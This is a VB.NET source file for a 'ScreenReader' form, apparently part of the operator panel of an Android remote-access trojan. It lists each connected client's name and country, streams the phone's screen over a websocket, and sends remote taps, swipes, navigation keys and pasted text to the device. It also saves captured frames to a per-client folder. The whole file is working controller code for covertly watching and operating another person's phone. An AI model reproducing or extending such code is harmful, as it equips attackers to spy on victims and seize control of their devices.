Imports System.ComponentModel
Imports Newtonsoft.Json.Linq
Imports System.Threading
Imports System.Net.Sockets
Imports System.Runtime.InteropServices.ComTypes
Imports Newtonsoft.Json
Imports System.IO
Imports System.Web.UI.WebControls

Public Class ScreenReader
    Public Btcli As BTClient
    Public FPS As Integer = 0
    Private websockclient As WebSocketClient = Nothing
    Public screenSize As Size = Nothing
    Private isDown As Boolean = False
    Private isClick As Boolean = False
    Private startX As Integer
    Private startY As Integer
    Private trackPoints As New List(Of Point)
    Private dragThreshold As Integer = 5
    Private Sub translateme()

    End Sub
    Private Sub ScreenReader_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Height = Me.Height + 25
        Me.myico.Image = Btcli.wallpaper
        ' Me.myscr.Image = Btcli.screen

        translateme()

        statetimer.Start()
    End Sub

    Private Sub ScreenReader_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        statetimer.Stop()
    End Sub
    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            Dim fpstext As String = ""
            If Me.FPS > 0 AndAlso stopbtn.Enabled Then
                fpstext = "FPS: " + FPS.ToString
                FPS = 0
            Else
                fpstext = "FPS: 0"

            End If
            If Btcli.isConnected Then
                ' Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = screnraderstr & " | " & Btcli.name & " | " & Btcli.country & " | " & fpstext

            Else
                Me.myico.Image = My.Resources.no_con
                'Me.myscr.Image = Nothing
                Me.mytitle.Text = screnraderstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Async Sub startbtn_Click(sender As Object, e As EventArgs) Handles startbtn.Click
        If startbtn.Enabled Then

            Dim datajoin As String = Await JoinServer(New With {
                               .case = "join",
                               .ping = "0",
                               .ismain = "0",
                               .chk = BTEngine.MainForm.Mainnextkey
                            }, BTEngine.MainForm.MainhttpClient)


            Dim socketidf As String = Btcli.SecoundIDF

            Dim result As JObject = JObject.Parse(datajoin)
            If result("Success") IsNot Nothing Then
                Dim datastr As String = result("Success").ToString.Trim("""")
                Log_d("Cli IDF websock", datastr)
                'Main_IDF = datastr

                websockclient = New WebSocketClient(screnraderstr, Btcli.address)

                Dim connectionThread = New Thread(Sub() websockclient.Connect(datastr))
                connectionThread.IsBackground = True
                connectionThread.Start()

                Do
                    Thread.Sleep(1)
                Loop While Not websockclient.IsConnected

                Log_d("IDF Ready to use", datastr)
                socketidf = datastr
            End If


            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "scread"},
                                 {"skidf", socketidf},
                                 {"cas", "1"}
                            }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            startbtn.Enabled = False
            stopbtn.Enabled = True
            myscr.Visible = True
        End If
    End Sub

    Private Sub stopbtn_Click(sender As Object, e As EventArgs) Handles stopbtn.Click
        If stopbtn.Enabled Then



            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "scread"},
                                 {"cas", "0"}
                            }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            startbtn.Enabled = True
            stopbtn.Enabled = False
            'mainstatelabel.Text = Disconnectedstr
            viewimage.Image = Nothing
            myscr.Visible = False
            If websockclient IsNot Nothing Then
                websockclient.Disconnect(screnraderstr, Btcli.address)
                websockclient = Nothing
            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon10_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon10.Click
        Dim chatData As New Dictionary(Of String, Object) From {
         {"msg", "screen"},
         {"subc", "nav"},
         {"nav", "ho"}
    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon11_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon11.Click
        Dim chatData As New Dictionary(Of String, Object) From {
          {"msg", "screen"},
          {"subc", "nav"},
          {"nav", "bak"}
     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon9_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon9.Click
        Dim chatData As New Dictionary(Of String, Object) From {
       {"msg", "screen"},
       {"subc", "nav"},
       {"nav", "rec"}
     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub inputtext_KeyDown(sender As Object, e As KeyEventArgs) Handles inputtext.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim sendtext As String = inputtext.Text

            e.SuppressKeyPress = True

            If isEmpty(sendtext) Then
                BTAlerter.infos("Enter text to send")
                Return
            End If

            Dim chatData As New Dictionary(Of String, Object) From {
                  {"msg", "screen"},
                 {"subc", "paste"},
                 {"txt", sendtext}
             }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            inputtext.Text = ""
        End If
    End Sub

    Private Sub viewimage_MouseDown(sender As Object, e As MouseEventArgs) Handles viewimage.MouseDown
        If e.Button = MouseButtons.Left Then
            trackPoints.Clear()
            startX = e.X
            startY = e.Y
            trackPoints.Add(New Point(startX, startY))
            isDown = True
            isClick = True
        End If
    End Sub

    Private Sub viewimage_MouseMove(sender As Object, e As MouseEventArgs) Handles viewimage.MouseMove
        If isDown Then
            Dim dx As Integer = Math.Abs(e.X - startX)
            Dim dy As Integer = Math.Abs(e.Y - startY)
            If dx > dragThreshold Or dy > dragThreshold Then
                isClick = False
                If e.X > 0 And e.Y > 0 Then
                    trackPoints.Add(New Point(e.X, e.Y))
                End If
            End If
        End If
    End Sub

    Private Sub viewimage_MouseUp(sender As Object, e As MouseEventArgs) Handles viewimage.MouseUp
        If screenSize = Nothing Then
            Return
        End If

        isDown = False
        Dim currentW As Integer = viewimage.Width
        Dim currentH As Integer = viewimage.Height

        ' Handle click or drag actions
        If isClick Then

            Dim pointJson As String = JsonConvert.SerializeObject(New With {
                 .x = CInt(Math.Round(startX * (screenSize.Width / currentW))),
                 .y = CInt(Math.Round(startY * (screenSize.Height / currentH)))
             })

            ' Call MoveScreen with movetype 0 for click
            MoveScreen("0", Btcli.mobid, pointJson)

        ElseIf trackPoints.Count > 0 Then
            ' Handle drag
            If e.X > 0 And e.Y > 0 Then
                trackPoints.Add(New Point(e.X, e.Y))
            End If
            Dim scaledPoints As List(Of Point) = trackPoints.Select(Function(p) New Point(
                CInt(Math.Round(p.X * (screenSize.Width / currentW))),
                CInt(Math.Round(p.Y * (screenSize.Height / currentH)))
            )).ToList()

            ' Create point string format
            Dim pointString As String = String.Join(":", scaledPoints.Select(Function(p) $"({p.X}, {p.Y})"))

            ' Call MoveScreen with movetype 1 for drag
            MoveScreen("1", Btcli.mobid, pointString)
        End If
    End Sub
    Private Sub MoveScreen(movetype As String, id As String, data As Object)
        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "screen"},
                             {"subc", "mov"},
                             {"movetype", movetype},
                             {"poi", data}
                        }
        BTEngine.commands(chatData, id, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub ctrlbtn_Click(sender As Object, e As EventArgs) Handles zoom_in.Click
        If startbtn.Enabled Then
            BTAlerter.infos("Start Screen reader first")
            Return
        End If

        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "scread"},
                                 {"xz", "1"},
                                 {"cas", "zom"}
                            }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub zoom_out_Click(sender As Object, e As EventArgs) Handles zoom_out.Click
        If startbtn.Enabled Then
            BTAlerter.infos("Start Screen reader first")
            Return
        End If

        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "scread"},
                                 {"xz", "0"},
                                 {"cas", "zom"}
                            }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub coloskeletonpick_ValueChanged(sender As Object, value As Color) Handles coloskeletonpick.ValueChanged
        Dim selectedcolor As Color = value
        Dim hexColor As String = "#" & selectedcolor.R.ToString("X2") & selectedcolor.G.ToString("X2") & selectedcolor.B.ToString("X2")

        Dim chatData As New Dictionary(Of String, Object) From {
                     {"msg", "screen"},
                     {"subc", "sklecolor"},
                     {"clr", hexColor}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub saveit_Click(sender As Object, e As EventArgs) Handles saveit.Click
        If viewimage.Image IsNot Nothing Then
            If saveit.Tag.ToString = "off" Then

                saveit.Tag = "on"
                savetimer.Start()

                saveit.ForeColor = Color.DeepSkyBlue
                boSave = True

            ElseIf saveit.Tag.ToString = "on" Then
                saveit.Tag = "off"
                saveit.ForeColor = Color.White
                savetimer.Stop()

                Dim cam As String = Btcli.userfolder & "\ScreenReader"
                If Not Directory.Exists(cam) Then
                    Directory.CreateDirectory(cam)
                End If
                Process.Start(cam)
                saveit.ForeColor = Color.White
                saveit.BackColor = Color.Transparent
                boSave = False

            End If
        End If
    End Sub
    Public boSave As Boolean = False
    Public newphoto As Boolean = False
    Private Sub savetimer_Tick(sender As Object, e As EventArgs) Handles savetimer.Tick
        Try
            Dim cam As String = Btcli.userfolder & "\ScreenReader"

            If boSave Then

                If newphoto Then
                    newphoto = False
                    If Not IO.Directory.Exists(cam) Then
                        IO.Directory.CreateDirectory(cam)
                    End If

                    If IO.Directory.Exists(cam) Then
                        viewimage.Image.Save(cam & "\p_" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
                    End If
                End If


            Else

                savetimer.Stop()
                savetimer.Dispose()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ScreenReader_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If websockclient IsNot Nothing Then
            websockclient.Disconnect(screnraderstr, Btcli.address)
            websockclient = Nothing
        End If
    End Sub
End Class